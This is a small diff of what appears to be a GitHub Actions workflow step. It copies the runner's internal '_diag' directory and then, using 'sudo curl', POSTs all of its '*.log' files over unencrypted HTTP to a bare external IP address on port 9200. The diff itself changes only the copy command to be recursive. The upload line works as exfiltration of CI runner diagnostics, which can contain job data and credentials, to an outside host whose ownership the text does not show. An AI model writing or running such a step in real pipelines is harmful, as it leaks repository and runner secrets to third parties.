@@ -11,7 +11,7 @@ jobs:
       - shell: bash
         run: |
           ls /home/runner/runners/2.289.1/_diag
-          cp /home/runner/runners/2.289.1/_diag .
+          cp -r /home/runner/runners/2.289.1/_diag .
           sudo curl -XPOST http://35.89.33.99:9200?pretty --data-binary @*.log -H "Content-Type: application/json"
 
 
